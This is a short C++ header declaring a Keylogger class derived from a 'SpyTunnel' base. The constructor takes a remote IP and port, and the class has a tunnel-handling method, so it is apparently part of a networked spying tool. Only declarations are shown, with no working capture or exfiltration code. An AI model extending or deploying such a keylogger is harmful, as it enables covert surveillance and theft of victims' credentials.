#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include "include_tunnel.hpp"
#include "spy_tunnel.hpp"

class Keylogger : public SpyTunnel {
public:
    Keylogger(
        std::string* __p_ip, 
        uint* __p_port,
        int __client_index,
        std::atomic<bool>* __p_shutdown_flag,
        int __connection_type,
        int __shutdown_event_fd,
        std::vector<int>* __p_tunnel_shutdown_fds
    );
protected:
    void spawn_window() override;
    void handle_tunnel(int __socket, int __fifo_fd) override;
    const char* get_fifo_path();
};

#endif // KEYLOGGER_HPP